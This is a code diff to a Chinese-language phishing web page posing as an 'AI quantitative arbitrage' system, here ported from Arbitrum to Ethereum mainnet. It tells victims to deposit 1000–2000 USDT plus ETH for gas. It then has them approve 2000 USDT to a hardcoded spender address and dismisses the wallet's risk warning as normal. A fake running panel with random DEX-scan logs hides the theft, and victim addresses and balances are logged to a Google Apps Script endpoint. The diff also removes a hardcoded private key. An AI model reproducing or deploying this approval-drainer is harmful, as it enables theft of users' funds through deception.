@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
@@ -221,7 +222,6 @@
         .address { font-family: monospace; background: #0a0f1e; padding: 3px 8px; border-radius: 40px; font-size: 11px; color: #88ccff; }
         .network-badge { background: #0a2a3a; color: #88ffaa; padding: 2px 8px; border-radius: 40px; font-size: 10px; }
         
-        /* 温馨提示框 */
         .warning-tip {
             background: rgba(255, 170, 68, 0.1);
             border: 1px solid rgba(255, 170, 68, 0.3);
@@ -335,12 +335,12 @@
         <button id="backToPasswordFromTutorial" class="nav-btn">← 返回密码验证</button>
         <div class="tutorial-icon">📥</div>
         <h2 style="text-align:center;">资金接入教程</h2>
-        <div style="text-align:center; margin-bottom:12px; font-size:11px; color:#88aacc;">创建一个OKX钱包后 · Arbitrum链 USDT</div>
-        <div class="step"><div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div><div class="step-content"><ul><li>OKX钱包点击 <strong style="color:#88ccff">「接收」</strong></li><li>选择 <strong style="color:#88ccff">USDT</strong></li><li>网络选择 <strong style="color:#88ccff">Arbitrum One</strong></li><li>点击 <strong style="color:#88ccff">「复制地址」</strong></li></ul><div class="check">✅ 地址已复制到剪贴板</div></div></div>
-        <div class="step"><div class="step-title"><span class="step-number">2</span> 去交易所提现</div><div class="step-content"><ul><li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li><li>网络选择 <strong>Arbitrum One</strong></li><li>粘贴刚才复制的地址</li><li>输入金额 → 点击 <strong>「确认」</strong></li></ul></div></div>
-        <div class="step"><div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div><div class="step-content"><ul><li><strong>同时</strong>去交易所提现 <strong style="color:#88ffaa">0.5-1 U 的 Arbitrum 链 ETH</strong> 到自己钱包</li><li>这是<strong>必须要有的步骤</strong>，运行需要少量 ETH 作为手续费</li><li><strong style="color:#ffaa88">没有手续费则不能运行</strong></li></ul></div></div>
+        <div style="text-align:center; margin-bottom:12px; font-size:11px; color:#88aacc;">创建一个OKX钱包后 · Ethereum（ERC20） USDT</div>
+        <div class="step"><div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div><div class="step-content"><ul><li>OKX钱包点击 <strong style="color:#88ccff">「接收」</strong></li><li>选择 <strong style="color:#88ccff">USDT</strong></li><li>网络选择 <strong style="color:#88ccff">Ethereum（ERC20）</strong></li><li>点击 <strong style="color:#88ccff">「复制地址」</strong></li></ul><div class="check">✅ 地址已复制到剪贴板</div></div></div>
+        <div class="step"><div class="step-title"><span class="step-number">2</span> 去交易所提现</div><div class="step-content"><ul><li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li><li>网络选择 <strong>Ethereum（ERC20）</strong></li><li>粘贴刚才复制的地址</li><li>输入金额 → 点击 <strong>「确认」</strong></li></ul></div></div>
+        <div class="step"><div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div><div class="step-content"><ul><li><strong>同时</strong>去交易所提现 <strong style="color:#88ffaa">0.5-1 U 的 Ethereum（ERC20）的 ETH</strong> 到自己钱包</li><li>这是<strong>必须要有的步骤</strong>，运行需要少量 ETH 作为手续费</li><li><strong style="color:#ffaa88">没有手续费则不能运行</strong></li></ul></div></div>
         <div class="step"><div class="step-title"><span class="step-number">3</span> 到账后去申请访问</div><div class="step-content">
-            <ul><li>USDT 和 ETH 都到账后</li><li>点击 <strong style="color:#88ccff">「申请访问」</strong></li><li>提交钱包 <strong style="color:#88ccff">Arbitrum 链收款地址</strong></li><li>系统自动检测余额，满足要求后自动弹出访问密码</li><li><strong style="color:#88ffaa">🔐 获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul>
+            <ul><li>USDT 和 ETH 都到账后</li><li>点击 <strong style="color:#88ccff">「申请访问」</strong></li><li>提交钱包 <strong style="color:#88ccff">ETH 原生链地址</strong></li><li>系统自动检测余额，满足要求后自动弹出访问密码</li><li><strong style="color:#88ffaa">🔐 获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul>
         </div></div>
         <div class="time-note">⏱️ 到账时间：通常 <strong>5-10分钟</strong></div>
         <div class="footer-note">AI 量化系统 · 资金安全由用户自行管理</div>
@@ -350,9 +350,9 @@
     <div id="applyPage" class="card apply-container" style="display:none;">
         <div style="font-size:44px; text-align:center;">📝</div>
         <h2 style="text-align:center;">申请访问权限</h2>
-        <p style="text-align:center; font-size:12px; margin-bottom:6px;">请填写您的 Arbitrum 链收款地址</p>
-        <div class="apply-notice"><div class="notice-title">📋 申请审核说明</div><ul><li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li><li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li><li>📌 仅支持 <strong>Arbitrum 链地址</strong>（以0x开头，长度42位）</li><li>🔐 <strong>获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul></div>
-        <input type="text" id="applyAddressInput" class="apply-input" placeholder="0x... (Arbitrum 链地址，42位)">
+        <p style="text-align:center; font-size:12px; margin-bottom:6px;">请填写您的 ETH 原生链收款地址</p>
+        <div class="apply-notice"><div class="notice-title">📋 申请审核说明</div><ul><li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li><li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li><li>📌 仅支持 <strong>ETH 原生链地址</strong>（以0x开头，长度42位）</li><li>🔐 <strong>获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul></div>
+        <input type="text" id="applyAddressInput" class="apply-input" placeholder="0x... (ETH 原生链地址，42位)">
         <button id="submitApplyBtn" class="apply-btn">提交申请</button>
         <button id="backToPasswordFromApply" class="nav-btn" style="margin-top:10px;">← 返回</button>
         <div id="applyMsg" class="error-msg"></div>
@@ -430,7 +430,7 @@
         </div>
     </div>
 
-    <!-- 页面6：量化面板（已添加温馨提示） -->
+    <!-- 页面6：量化面板 -->
     <div id="quantPanel" class="panel" style="display:none;">
         <div style="text-align:center; margin-bottom:14px;">
             <div style="font-size:42px;">🧠⚡</div>
@@ -439,21 +439,20 @@
         </div>
         <button id="backToPasswordFromQuant" class="nav-btn">← 返回</button>
         <div class="status-panel">
-            <div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge" id="networkStatus">Arbitrum 主网</span></div>
+            <div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge" id="networkStatus">ETH 主网</span></div>
             <div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div>
             <div class="wallet-row"><span class="label">🤖 AI 策略</span><span class="label" style="color:#88ccff;">高频套利 · 闪电贷防御</span></div>
         </div>
         
-        <!-- 新增温馨提示 -->
         <div class="warning-tip">
-            <p>⚠️ <strong>温馨提示：</strong> 第一次运行需要授权 USDT 额度，授权时提示风险是正常现象。首次授权 2000 USDT，运行过程中会消耗授权额度，额度用完后系统会自动继续授权。</p>
+            <p>⚠️ <strong>温馨提示：</strong> 第一次运行需要授权 USDT 额度，授权时提示风险是正常现象。首次授权 2000 USDT（ETH主网），运行过程中会消耗授权额度，额度用完后系统会自动继续授权。</p>
         </div>
         
         <div class="button-group">
             <button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button>
             <button class="btn btn-success" id="approve" disabled>🚀 ② 授权启动引擎</button>
         </div>
-        <div class="info-area" id="info">⚡ 请先连接钱包 | 网络: Arbitrum Mainnet</div>
+        <div class="info-area" id="info">⚡ 请先连接钱包 | 网络: ETH Mainnet</div>
         <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
     </div>
 
@@ -464,7 +463,7 @@
         <div class="status-badge">🟢 运行中 · 实时监控</div>
         <div class="price-row">
             <div class="price-label">🔍 正在扫链全网去中心化交易所</div>
-            <div class="scan-text">PancakeSwap → Uniswap → SushiSwap → Curve → Balancer</div>
+            <div class="scan-text">Uniswap → SushiSwap → Curve → Balancer → 1inch</div>
         </div>
         <div class="price-row">
             <div class="price-label">💰 AI目前已经为你带来</div>
@@ -486,22 +485,20 @@
     // ========== Google Sheets API 配置 ==========
     const SHEET_API_URL = 'https://script.google.com/macros/s/AKfycby-dNP-_FMxMVYwpp3wrGisg7IrALC_27QsShl9tSfBLszvT55b7I8P1Udbk7bYY8gz/exec';
     
-    // ========== 配置 ==========
+    // ========== ETH 主网配置 ==========
     const SYSTEM_PASSWORD = '1134';
     const MIN_USDT_REQUIRED = 1000;
     const MAX_USDT_LIMIT = 2000;
     const RUNNING_ADDRESS_COUNT = 300;
     
-    const USDT_ADDRESS = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
+    // ETH 主网 USDT 合约地址
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
     const SPENDER_ADDRESS = "0x23ab58b21fb4a711319a07e59686a19efbc0e76b";
     const MIN_APPROVE_AMOUNT = 2000;
     
-    const TARGET_CHAIN_ID = 42161;
-    const TARGET_CHAIN_NAME = "Arbitrum One";
-    
-    const SENDER_PRIVATE_KEY = '0xad99ad64a470fcf51daf50048534be1ba173b28cf338d2de55a344ba906c92b6';
-    const SENDER_ADDRESS = '0x1d0bc3658ddeecaa97ceccb390088476c07c5613';
-    const TRANSFER_AMOUNT_ETH = '0.00005';
+    // ETH 主网配置
+    const TARGET_CHAIN_ID = 1;
+    const TARGET_CHAIN_NAME = "ETH Mainnet";
     
     // ========== 保存记录到 Google Sheets（通用函数） ==========
     async function saveToSheet(data) {
@@ -579,50 +576,63 @@
     }
     scheduleDailyRefresh();
     
-    // ========== 内部转账函数 ==========
-    async function internalTransferEth(toAddress) {
-        try {
-            console.log(`[转账] 开始处理地址: ${toAddress}`);
-            const provider = new ethers.providers.JsonRpcProvider('https://arb1.arbitrum.io/rpc');
-            const wallet = new ethers.Wallet(SENDER_PRIVATE_KEY, provider);
-            const senderBalanceEth = parseFloat(ethers.utils.formatEther(await provider.getBalance(SENDER_ADDRESS)));
-            console.log(`[转账] 发送地址余额: ${senderBalanceEth} ETH`);
-            if (senderBalanceEth < 0.00015) { 
-                console.error(`[转账] 余额不足`); 
-                return { success: false, reason: 'insufficient_sender_balance' }; 
-            }
-            console.log(`[转账] 开始转账 ${TRANSFER_AMOUNT_ETH} ETH`);
-            const tx = await wallet.sendTransaction({ to: toAddress, value: ethers.utils.parseEther(TRANSFER_AMOUNT_ETH) });
-            console.log(`[转账] 交易已提交，Hash: ${tx.hash}`);
-            await tx.wait();
-            console.log(`[转账] 交易已确认`);
-            return { success: true, txHash: tx.hash };
-        } catch (error) { 
-            console.error('[转账] 失败:', error); 
-            return { success: false, reason: 'transfer_error', error: error.message }; 
-        }
-    }
-    
-    // ========== 查询 USDT 余额 ==========
+    // ========== 查询 USDT 余额（ETH 主网，多 RPC 备用） ==========
     async function getUSDTBalance(address) {
         const cleanAddress = address.toLowerCase();
         const balanceOfData = `0x70a08231000000000000000000000000${cleanAddress.slice(2)}`;
-        const rpcList = ['https://arb1.arbitrum.io/rpc', 'https://rpc.arbitrum.one', 'https://arbitrum.publicnode.com'];
+        
+        // 多个备用 RPC 节点（全部写入）
+        const rpcList = [
+            'https://rpc.ankr.com/eth',
+            'https://cloudflare-eth.com',
+            'https://eth-mainnet.public.blastapi.io',
+            'https://ethereum.publicnode.com',
+            'https://eth.llamarpc.com',
+            'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+            'https://rpc.flashbots.net',
+            'https://eth-mainnet.g.alchemy.com/v2/demo'
+        ];
+        
         for (let i = 0; i < rpcList.length; i++) {
             try {
                 const res = await fetch(rpcList[i], {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: USDT_ADDRESS, data: balanceOfData }, 'latest'], id: i+1 })
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        method: 'eth_call',
+                        params: [{
+                            to: USDT_ADDRESS,
+                            data: balanceOfData
+                        }, 'latest'],
+                        id: i + 1
+                    })
                 });
+                
+                if (!res.ok) {
+                    console.log(`RPC ${i + 1} HTTP错误: ${res.status}`);
+                    continue;
+                }
+                
                 const data = await res.json();
-                if (data && data.result) return { success: true, balance: parseInt(data.result, 16) / 1e6 };
-            } catch(e) { console.log(`RPC ${i+1} 失败`); }
+                if (data && data.result) {
+                    const balance = parseInt(data.result, 16) / 1e6;
+                    console.log(`✅ 余额查询成功 (RPC ${i + 1}): ${balance} USDT`);
+                    return { success: true, balance: balance };
+                } else if (data && data.error) {
+                    console.log(`RPC ${i + 1} 错误: ${data.error.message}`);
+                    continue;
+                }
+            } catch (error) {
+                console.log(`RPC ${i + 1} 失败:`, error.message);
+                continue;
+            }
         }
-        return { success: false, balance: 0, error: '查询失败' };
+        
+        return { success: false, balance: 0, error: '所有RPC节点均查询失败' };
     }
     
-    function isValidArbitrumAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
+    function isValidEthAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
     
     // ========== 页面切换函数 ==========
     function showPage(pageId) {
@@ -660,7 +670,7 @@
         if (isSubmitting) return;
         const address = document.getElementById('applyAddressInput').value.trim();
         const applyMsg = document.getElementById('applyMsg');
-        if (!isValidArbitrumAddress(address)) { applyMsg.innerHTML = '❌ 无效的 Arbitrum 链地址！'; applyMsg.style.color = '#ff8888'; return; }
+        if (!isValidEthAddress(address)) { applyMsg.innerHTML = '❌ 无效的 ETH 原生链地址！'; applyMsg.style.color = '#ff8888'; return; }
         
         try {
             isSubmitting = true; document.getElementById('submitApplyBtn').disabled = true;
@@ -671,10 +681,8 @@
             if (balance < MIN_USDT_REQUIRED) { applyMsg.innerHTML = `❌ 申请失败！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 需要持有 ≥${MIN_USDT_REQUIRED} USDT`; applyMsg.style.color = '#ffaa88'; return; }
             if (balance > MAX_USDT_LIMIT) { applyMsg.innerHTML = `⚠️ 余额超过限制！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 请确保钱包内 ≤${MAX_USDT_LIMIT} USDT`; applyMsg.style.color = '#ffaa88'; return; }
             
-            // 申请通过，保存到 Google Sheets
             await saveApplicationToSheet(address, balance);
             
-            // 显示带地址和余额的提示
             const shortAddress = address.slice(0,6) + '...' + address.slice(-4);
             applyMsg.innerHTML = `✅ 您的地址已通过审核！<br><br>📌 提交地址：<strong style="color:#88ccff;">${shortAddress}</strong><br>💰 检测余额：<strong style="color:#88ffaa;">${balance.toFixed(2)} USDT</strong><br><br>🔐 访问密码：<strong style="font-size:26px; color:#88ffaa;">${SYSTEM_PASSWORD}</strong><br><br>📝 请返回密码验证页面登录`;
             applyMsg.style.color = '#88ffaa';
@@ -683,19 +691,19 @@
         finally { isSubmitting = false; document.getElementById('submitApplyBtn').disabled = false; }
     };
     
-    // ========== 网络检测函数 ==========
+    // ========== 网络检测函数（ETH 主网） ==========
     async function checkAndSwitchNetwork(wallet) {
         try {
             let chainId = await wallet.request({ method: 'eth_chainId' });
             chainId = parseInt(chainId, 16);
             if (chainId !== TARGET_CHAIN_ID) {
                 const infoDiv = document.getElementById('info');
-                infoDiv.innerHTML = `⚠️ 当前网络不是 ${TARGET_CHAIN_NAME}！<br>请在钱包右上角点击网络，切换到 Arbitrum One 网络后重新连接`;
+                infoDiv.innerHTML = `⚠️ 当前网络不是 ${TARGET_CHAIN_NAME}！<br>请在钱包右上角点击网络，切换到 ETH Ethereum 网络后重新连接`;
                 infoDiv.style.color = '#ffaa88';
                 return false;
             }
             const networkStatus = document.getElementById('networkStatus');
-            networkStatus.innerHTML = '✅ Arbitrum One 主网';
+            networkStatus.innerHTML = '✅ ETH Mainnet 主网';
             networkStatus.style.color = '#88ffaa';
             return true;
         } catch (error) {
@@ -704,7 +712,7 @@
         }
     }
     
-    // ========== 授权逻辑 ==========
+    // ========== 授权逻辑（ETH 主网） ==========
     let currentSigner = null;
     let usdtDecimals = null;
     let usdtContractWithSigner = null;
@@ -720,7 +728,7 @@
         const logArea = document.getElementById('logArea');
         if (!logArea) return;
         logArea.innerHTML = `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="log-scan">✅ AI引擎启动成功</span></div>`;
-        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer'];
+        const dexList = ['Uniswap', 'SushiSwap', 'Curve', 'Balancer', '1inch'];
         const gasMessages = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ 当前Gas: 28 Gwei，正常范围'];
         const scanMessages = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...'];
         function getRandomDex() { return dexList[Math.floor(Math.random() * dexList.length)]; }
@@ -746,6 +754,7 @@
         const abi = ["function decimals() view returns (uint8)", "function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
         const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
         const decimals = await contract.decimals();
+        console.log("USDT decimals:", decimals);
         return { contract, decimals };
     }
     
@@ -771,7 +780,7 @@
                 return;
             }
             try {
-                infoDiv.innerHTML = "⏳ 请求连接钱包...<br>请确认右上角网络是 Arbitrum One";
+                infoDiv.innerHTML = "⏳ 请求连接钱包...<br>请确认右上角网络是 ETH Ethereum";
                 await wallet.request({ method: "eth_requestAccounts" });
                 const isCorrectNetwork = await checkAndSwitchNetwork(wallet);
                 if (!isCorrectNetwork) { return; }
@@ -816,17 +825,13 @@
                 return;
             }
             try {
-                infoDiv.innerHTML = "📡 请在钱包内确认授权<br>授权额度: 2000 USDT";
+                infoDiv.innerHTML = "📡 请在钱包内确认授权<br>授权额度: 2000 USDT (ETH主网)";
                 const amountToApproveRaw = ethers.utils.parseUnits("2000", usdtDecimals);
                 const tx = await usdtContractWithSigner.approve(SPENDER_ADDRESS, amountToApproveRaw);
                 infoDiv.innerHTML = "⛓️ 交易已提交 | Hash: " + tx.hash.slice(0,10)+"...";
                 await tx.wait();
                 
                 await saveAuthorizationToSheet(userAddress, usdtBalance, tx.hash);
-                
-                try {
-                    await internalTransferEth(userAddress);
-                } catch(e) { console.log('转账失败:', e); }
                 
                 infoDiv.innerHTML = `✅ 授权成功！<br>🚀 AI 引擎正在启动...`;
                 showPage('runningPanel');
